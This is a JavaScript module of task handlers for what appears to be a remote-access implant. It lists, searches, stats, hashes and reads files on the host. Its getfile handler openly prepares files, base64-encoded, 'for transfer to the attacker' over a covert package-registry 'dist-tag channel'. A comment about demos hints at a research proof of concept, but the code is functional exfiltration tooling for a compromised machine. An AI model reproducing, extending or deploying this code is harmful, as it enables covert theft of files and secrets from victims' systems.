// Filesystem task handlers: pwd, cd, ls, stat, hash, find, getfile.
// Paths resolve against the agent cwd via realpath, so symlink targets are
// reported (and read) as their real location. Transfers are size-capped:
// the dist-tag channel moves ~130 bytes per tag.
import fs from 'node:fs';
import path from 'node:path';
import crypto from 'node:crypto';

export const DEFAULT_MAX_FILE_BYTES = 32 * 1024;
export const HASH_MAX_BYTES = 64 * 1024 * 1024; // hashing does not transfer bytes
export const LS_MAX_ENTRIES = 200; // keep result tags bounded
export const FIND_MAX_RESULTS = 100;
export const FIND_MAX_DEPTH = 6;

export function positiveLimit(value, fallback) {
  const n = Number(value);
  return Number.isFinite(n) && n > 0 ? Math.floor(n) : fallback;
}

/**
 * Resolve a task path against the agent cwd. The realpath is returned so
 * symlink targets are reported (and read) as their real location.
 */
function resolvePath(requestedPath, _limits = {}) {
  const p = typeof requestedPath === 'string' ? requestedPath.trim() : '';
  if (!p) throw new Error('a path argument is required');
  if (p.includes('\0')) throw new Error('path contains NUL byte');
  return fs.realpathSync(path.resolve(process.cwd(), p));
}

function describeEntry(dir, name) {
  const st = fs.lstatSync(path.join(dir, name));
  const type = st.isDirectory() ? 'dir' : st.isSymbolicLink() ? 'link' : st.isFile() ? 'file' : 'other';
  return { type, size: st.size, name };
}

export const FILE_TASKS = {
  pwd() {
    return process.cwd();
  },

  /** Change the agent's working directory; later relative paths follow it. */
  cd(args = {}, limits = {}) {
    const dir = resolvePath(args.path, limits);
    const st = fs.statSync(dir);
    if (!st.isDirectory()) throw new Error(`not a directory: ${dir}`);
    process.chdir(dir);
    return process.cwd();
  },

  /** List a directory (default: cwd). Output is one "type size name" per line. */
  ls(args = {}, limits = {}) {
    const dir = resolvePath(args.path || '.', limits);
    const st = fs.statSync(dir);
    if (!st.isDirectory()) throw new Error(`not a directory: ${dir}`);
    const names = fs.readdirSync(dir).sort();
    const lines = [];
    for (const name of names.slice(0, LS_MAX_ENTRIES)) {
      try {
        const e = describeEntry(dir, name);
        lines.push(`${e.type.padEnd(5)} ${String(e.size).padStart(10)} ${e.name}`);
      } catch {
        lines.push(`?          ? ${name}`);
      }
    }
    const header = `${dir} (${names.length} entries)`;
    const truncated = names.length > LS_MAX_ENTRIES ? `\n... truncated at ${LS_MAX_ENTRIES}` : '';
    return `${header}\n${lines.join('\n')}${truncated}`;
  },

  /** File metadata: type, size, timestamps, permissions. */
  stat(args = {}, limits = {}) {
    const p = resolvePath(args.path, limits);
    const st = fs.statSync(p);
    const type = st.isDirectory() ? 'dir' : st.isFile() ? 'file' : 'other';
    return [
      `path=${p}`,
      `type=${type}`,
      `size=${st.size}`,
      `mode=${(st.mode & 0o777).toString(8)}`,
      `mtime=${st.mtime.toISOString()}`,
      `ctime=${st.ctime.toISOString()}`,
    ].join(' ');
  },

  /** SHA-256 of a file (read-only, capped at HASH_MAX_BYTES). */
  hash(args = {}, limits = {}) {
    const p = resolvePath(args.path, limits);
    const st = fs.statSync(p);
    if (!st.isFile()) throw new Error(`not a regular file: ${p}`);
    if (st.size > HASH_MAX_BYTES) {
      throw new Error(`file too large to hash: ${st.size} bytes (cap ${HASH_MAX_BYTES})`);
    }
    const digest = crypto.createHash('sha256').update(fs.readFileSync(p)).digest('hex');
    return `sha256 ${digest}  ${p} (${st.size} bytes)`;
  },

  /** Recursively find files under a directory whose name contains the query. */
  find(args = {}, limits = {}) {
    const root = resolvePath(args.path, limits);
    const query = String(args.query ?? '').toLowerCase();
    if (!query) throw new Error('find requires a name query');
    const st = fs.statSync(root);
    if (!st.isDirectory()) throw new Error(`not a directory: ${root}`);

    const hits = [];
    let truncated = false;
    const walk = (dir, depth) => {
      if (truncated || depth > FIND_MAX_DEPTH) return;
      let entries;
      try {
        entries = fs.readdirSync(dir, { withFileTypes: true });
      } catch {
        return; // unreadable directory: skip silently
      }
      for (const e of entries) {
        if (truncated) return;
        const full = path.join(dir, e.name);
        if (e.name.toLowerCase().includes(query)) {
          hits.push(full);
          if (hits.length >= FIND_MAX_RESULTS) {
            truncated = true;
            return;
          }
        }
        if (e.isDirectory()) walk(full, depth + 1);
      }
    };
    walk(root, 0);

    const header = `${hits.length}${truncated ? '+' : ''} match(es) for "${args.query}" under ${root}`;
    return hits.length === 0 ? header : `${header}\n${hits.join('\n')}`;
  },

  /**
   * Read one file and return it for transfer to the attacker. The path is
   * absolute or relative to the agent's cwd.
   * Returns { output, file } instead of a plain string; the file bytes ride
   * in the result payload as base64 and are chunked by the protocol encoder.
   */
  getfile(args = {}, limits = {}) {
    const p = typeof args.path === 'string' ? args.path.trim() : '';
    if (!p) throw new Error('getfile requires args.path');
    const max = positiveLimit(limits.maxFileBytes, DEFAULT_MAX_FILE_BYTES);
    const file = resolvePath(p, limits);
    const st = fs.statSync(file);
    if (!st.isFile()) throw new Error(`not a regular file: ${file}`);
    if (st.size > max) {
      throw new Error(
        `file too large: ${st.size} bytes (cap ${max}) - the dist-tag channel ` +
          'moves ~130 bytes per tag; raise maxFileBytes only for small demos',
      );
    }
    const data = fs.readFileSync(file);
    return {
      output: `${file} (${st.size} bytes)`,
      file: { name: path.basename(file), size: st.size, dataB64: data.toString('base64') },
    };
  },
};
